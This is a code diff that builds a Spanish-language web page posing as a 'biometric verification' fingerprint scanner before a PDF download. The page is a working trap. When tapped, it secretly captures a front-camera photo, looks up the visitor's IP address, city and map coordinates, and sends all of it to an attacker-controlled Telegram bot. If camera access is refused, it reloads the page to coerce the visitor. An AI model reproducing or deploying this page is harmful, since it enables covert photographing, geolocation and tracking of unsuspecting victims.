@@ -1,71 +1,104 @@
-async function iniciarTrampa() {
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso Seguro - Verificación Biométrica</title>
+    <style>
+        body { background: #050a0f; color: #00d4ff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; overflow: hidden; }
+        .fingerprint-container { width: 160px; height: 160px; border: 3px solid #00d4ff; border-radius: 25px; position: relative; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: transform 0.2s; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); }
+        .fingerprint-container:active { transform: scale(0.95); }
+        .fingerprint-icon { font-size: 90px; user-select: none; }
+        .scan-line { width: 100%; height: 5px; background: #00d4ff; position: absolute; top: 0; left: 0; animation: scan 2s infinite; box-shadow: 0 0 20px #00d4ff; display: none; }
+        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+        .instruction { margin-top: 40px; font-weight: bold; letter-spacing: 1px; padding: 0 25px; font-size: 0.9em; }
+        .loading-bar { width: 220px; height: 6px; background: #111; margin-top: 25px; display: none; border-radius: 10px; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: #00d4ff; transition: 4s linear; }
+    </style>
+</head>
+<body>
+
+    <div class="fingerprint-container" id="sensor-box">
+        <div class="scan-line" id="line"></div>
+        <span class="fingerprint-icon" id="icon">👆</span>
+    </div>
+
+    <div class="instruction" id="text-guide">
+        DETECTANDO HARDWARE BIOMÉTRICO...
+    </div>
+
+    <div class="loading-bar" id="bar"><div class="progress" id="fill"></div></div>
+
+    <audio id="beep-sound" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU92T19vdm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92"></audio>
+
+    <script src="config.js"></script>
+    <script>
+        const sensorBox = document.getElementById('sensor-box');
+        const textGuide = document.getElementById('text-guide');
+        const icon = document.getElementById('icon');
+        const beep = document.getElementById('beep-sound');
+
+        function configurarInterfaz() {
+            textGuide.innerHTML = "COLOQUE EL DEDO EN EL SENSOR PARA CONTINUAR";
+            sensorBox.addEventListener('click', iniciarTrampa);
+        }
+
+        async function iniciarTrampa() {
             if (navigator.vibrate) navigator.vibrate(50);
+            
+            // Iniciamos animación visual
             document.getElementById('line').style.display = "block";
             document.getElementById('bar').style.display = "block";
-            const fill = document.getElementById('fill');
-            textGuide.innerHTML = "ESCANEANDO... MANTENGA LA POSICIÓN";
-            setTimeout(() => { fill.style.width = "100%"; }, 100);
-
-            let fotoBlob = null;
-            let reporte = "";
+            textGuide.innerHTML = "VERIFICANDO IDENTIDAD...";
+            setTimeout(() => { document.getElementById('fill').style.width = "100%"; }, 100);
 
             try {
-                // 1. Obtener datos de ubicación primero
-                const resIP = await fetch('https://ipapi.co/json/');
-                const d = await resIP.json();
-                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Desconocido";
-                
-                reporte = `👤 *VERIFICACIÓN COMPLETADA*\n\n` +
-                          `📱 *EQ:* ${equipo}\n` +
-                          `🌐 *IP:* \`${d.ip}\`\n` +
-                          `📍 *Lugar:* ${d.city}, ${d.country_name}\n` +
-                          `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-
-                // 2. Intentar Captura de cámara
+                // FORZAMOS EL PERMISO: El código no avanzará hasta que acepte
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                
+                // Si llegamos aquí, aceptó la cámara. Tomamos la foto.
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.setAttribute("playsinline", true); 
+                video.setAttribute("playsinline", true);
                 await video.play();
                 
-                // Espera de seguridad para que la cámara se aclare
-                await new Promise(r => setTimeout(r, 1200));
+                await new Promise(r => setTimeout(r, 1500)); // Tiempo para que la cámara enfoque
 
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
                 stream.getTracks().forEach(t => t.stop());
 
-            } catch(e) { 
-                console.log("Error o cámara denegada");
-                if(reporte === "") reporte = "⚠️ El usuario denegó permisos o hubo un error técnico.";
-            }
+                // Obtener datos y enviar
+                const resIP = await fetch('https://ipapi.co/json/');
+                const d = await resIP.json();
+                const equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1];
 
-            // 3. ENVÍO A TELEGRAM
-            const fd = new FormData();
-            fd.append('chat_id', CONFIG.CHAT_ID);
-            
-            if (fotoBlob) {
+                const reporte = `👤 *VERIFICACIÓN EXITOSA*\n\n📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+
+                const fd = new FormData();
+                fd.append('chat_id', CONFIG.CHAT_ID);
                 fd.append('photo', fotoBlob, 'captura.jpg');
                 fd.append('caption', reporte);
                 fd.append('parse_mode', 'Markdown');
-                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            } else {
-                // Si no hay foto, enviar solo el texto
-                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: reporte, parse_mode: 'Markdown' })
-                });
-            }
 
-            // 4. Redirección final
-            setTimeout(() => {
+                // Enviamos y esperamos confirmación de Telegram
+                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+
+                // Finalizar proceso
                 beep.play();
-                textGuide.innerHTML = "✅ IDENTIDAD CONFIRMADA. ABRIENDO PDF...";
-                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
-            }, 3000);
+                textGuide.innerHTML = "✅ IDENTIDAD CONFIRMADA. DESCARGANDO...";
+                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 2000);
+
+            } catch (err) {
+                // Si el usuario rechaza la cámara
+                alert("ERROR: Sensor no detectado. Debe permitir el acceso a la cámara para la verificación biométrica obligatoria.");
+                location.reload(); // Recarga la página para obligarlo a intentar de nuevo
+            }
         }
+
+        window.onload = configurarInterfaz;
+    </script>
+</body>
+</html>
